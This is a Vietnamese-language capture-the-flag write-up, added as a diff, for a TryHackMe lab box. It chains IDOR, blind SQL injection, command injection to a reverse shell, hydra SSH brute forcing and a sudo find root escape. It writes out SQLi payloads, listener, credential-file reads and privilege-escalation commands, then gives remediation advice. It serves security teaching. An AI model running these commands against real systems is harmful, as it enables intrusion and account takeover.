@@ -1,0 +1,168 @@
+---
+title: 'Operation Promotion'
+description: 'Một IDOR trong trang tra cứu admin lộ ra trang bảo trì ẩn; SQLi boolean-blind dump bảng user; trang ping dính command injection cho shell www-data; một wordlist nhắm đích crack được login SSH, và sudo find trao quyền root.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Operation Promotion'
+roomUrl: 'https://tryhackme.com/room/operationpromotion'
+difficulty: easy
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'idor'
+  - 'command-injection'
+  - 'password-cracking'
+  - 'sudo'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'insecure direct object reference'
+  - 'insecure command execution'
+  - 'weak credentials'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Operation Promotion" trên TryHackMe (RecruitCorp Careers Portal). Ta chuyển từ một IDOR sang một trang bảo trì ẩn, viết script khai thác SQL injection kiểu boolean-blind để dump toàn bộ user, biến một trang chẩn đoán thành shell, crack một login SSH bằng một wordlist nhỏ gọn đúng đích, và lợi dụng cấu hình sai_ _`sudo find`_ _để lên root._
+
+> Operation Promotion là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Cả hai flag và mọi credential khôi phục được đều hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Cổng careers Apache với `/admin/` bị `robots.txt` disallow → một **IDOR** trong `admin/users/lookup.php?id=` liệt kê tài khoản và lộ ra service account `sysmaint` cùng một `sysmaint-checks/ping.php` ẩn → trang lookup **dính blind SQL injection**, viết script để dump cả 9 user → trang ping **dính command injection** qua tham số `hosts` → **reverse shell dưới www-data** → `db.conf` + `/etc/passwd` lộ user `jford` → hash bcrypt không crack được, nên dựng một wordlist nhỏ dựa trên `spring2026` bằng rule hashcat và `hydra` vào SSH (`spring2026!`) → user flag → `sudo -l` cho thấy **NOPASSWD** **`/usr/bin/find`** → `find -exec /bin/sh -p` → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH, một site careers Apache và Samba:
+
+```text
+22/tcp  open  ssh          OpenSSH 9.6p1 Ubuntu
+80/tcp  open  http         Apache httpd 2.4.58   # RecruitCorp - Careers Portal
+139/tcp open  netbios-ssn  Samba smbd 4
+445/tcp open  netbios-ssn  Samba smbd 4
+```
+
+Một phiên SMB null để lộ share `public` chỉ-đọc với mỗi một `README.txt` làm cảnh. `robots.txt` disallow `/admin/`, và quét thư mục xác nhận — đó là nơi có chuyện.
+
+### **Lỗ hổng**
+
+Khu admin để lộ `users/lookup.php?id=N`. Hai lỗi nằm trong cùng một tham số: nó là một **IDOR** (ta đọc được bất kỳ bản ghi nào bằng cách lặp id) và nó **dính SQL injection** (id trôi thẳng vào truy vấn mà không được làm sạch). IDOR làm lộ service account `sysmaint` và một thư mục bảo trì ẩn; SQLi cho phép dump mọi credential.
+
+<Callout type="insight">
+
+Đoạn injection là **boolean-blind**: form login/lookup trả về redirect 3xx khi điều kiện chèn vào đúng và trả 200 khi sai. Tín hiệu có/không duy nhất đó là một oracle hoàn hảo — bọc nó trong một binary search trên `UNICODE(SUBSTR(...))` và bạn trích xuất username và password từng ký tự một, không cần thông báo lỗi hay dữ liệu phản hồi.
+
+</Callout>
+
+### **Bước 1 — IDOR → trang bảo trì ẩn**
+
+Lặp `lookup.php?id=` liệt kê user và lòi ra service account `sysmaint`, trỏ tới một khu bảo trì chứa `ping.php` dưới `admin/.../sysmaint-checks/`. Giữ trang đó cho sau — nó là bàn đạp.
+
+### **Bước 2 — blind SQLi → dump bảng user**
+
+`sqlmap` xác nhận điểm injection; một script nhỏ viết riêng giúp việc trích xuất ổn định. Oracle là “phản hồi có redirect không?”:
+
+```text
+# oracle: injected condition true -> 301/302/303
+'  OR 1=1 --   -> redirect (true)
+'  OR 1=2 --   -> 200      (false)
+```
+
+Binary-search từng ký tự qua `UNICODE(SUBSTR((SELECT ... FROM users LIMIT 1 OFFSET n),p,1))` dump cả chín dòng:
+
+```text
+Recovered credentials (values redacted):
+  admin:<redacted>
+  mvasquez / tparker / lhayes / kchen / rdavis / sysmaint / jbailey / aokafor : <redacted>
+```
+
+### **Bước 3 — command injection → shell www-data**
+
+Trang bảo trì `ping.php` nhận tham số `hosts` và đưa nó qua một shell. Chèn một lệnh để tải và thực thi payload; một listener bắt được shell:
+
+```text
+nc -lvnp 4444
+# uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Config app và `/etc/passwd` chỉ tên mục tiêu kế tiếp:
+
+```text
+www-data@recruitcorp:/var/www/html/config$ cat db.conf
+# db_user=jford
+# db_pass_hash=<redacted bcrypt hash>
+www-data@recruitcorp:...$ grep bash /etc/passwd
+# jford:x:1001:1001::/home/jford:/bin/bash
+```
+
+### **Bước 4 — crack một wordlist nhắm đích → SSH thành jford (flag)**
+
+Hash bcrypt chống crack và các mật khẩu DB dump được không giúp gì. Nội dung site gợi ý một mật khẩu theo mùa (“Seasons combined with years”), nên ta gieo `spring2026` và mở rộng bằng một bộ rule hashcat, rồi spray SSH:
+
+```text
+echo 'spring2026' > base.txt
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt   # ~98k ung vien
+hydra -l jford -P wordlist.txt ssh://$IP
+# [22][ssh] login: jford   password: <redacted>   (một biến thể của spring2026)
+```
+
+```text
+ssh jford@$IP
+jford@recruitcorp:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 5 — sudo find → root (flag)**
+
+`jford` được chạy `find` với quyền root mà không cần mật khẩu — một escape GTFOBins kinh điển:
+
+```text
+jford@recruitcorp:~$ sudo -l
+# (root) NOPASSWD: /usr/bin/find
+jford@recruitcorp:~$ sudo /usr/bin/find . -exec /bin/sh -p \; -quit
+# whoami -> root
+# cat /root/flag.txt
+THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Một kẻ tấn công chưa xác thực kết chuỗi một IDOR và một blind SQL injection để dump mọi tài khoản, rồi một command injection để thực thi mã dưới www-data. Một mật khẩu SSH yếu, dễ đoán và một luật `sudo` quá rộng (`NOPASSWD` trên `find`) leo lên root đầy đủ — xâm phạm hoàn toàn host và cơ sở dữ liệu tuyển dụng.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Dùng truy vấn tham số hoá (parameterised)** cho `lookup.php` và ép kiểm tra phân quyền để user không đọc được bản ghi tuỳ ý theo id (vá cả SQLi lẫn IDOR).
+- **Không bao giờ đưa input người dùng vào shell** ở trang chẩn đoán — xác minh host và gọi API không qua shell.
+- **Ép mật khẩu mạnh**; một mật khẩu `mùa+năm` gục trước một wordlist nhỏ dựa trên rule.
+- **Siết sudo.** Cấp `NOPASSWD` cho `find` (hay bất kỳ binary có `-exec`) tương đương cấp root. Giới hạn sudo vào các lệnh cụ thể, không escape được.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một tham số, hai lỗi.** Cùng một `id` vừa là IDOR vừa là điểm SQL injection — luôn test định danh cho cả hai.
+- **Một redirect là oracle blind-SQLi rất tốt.** Bạn không cần output lỗi để rút trộm cả một bảng.
+- **Chính sách mật khẩu thắng độ mạnh của hash.** bcrypt bảo vệ hash, nhưng một sơ đồ mật khẩu dễ đoán vẫn phá hỏng nó.
+- **Kiểm tra** **`sudo -l`** **trước tiên.** `find` trong danh sách là đường một dòng tới root.
+
+Operation Promotion là một chuỗi box dễ gọn gàng, thưởng cho việc enumerate kỹ lưỡng. Cảm ơn đã đọc.
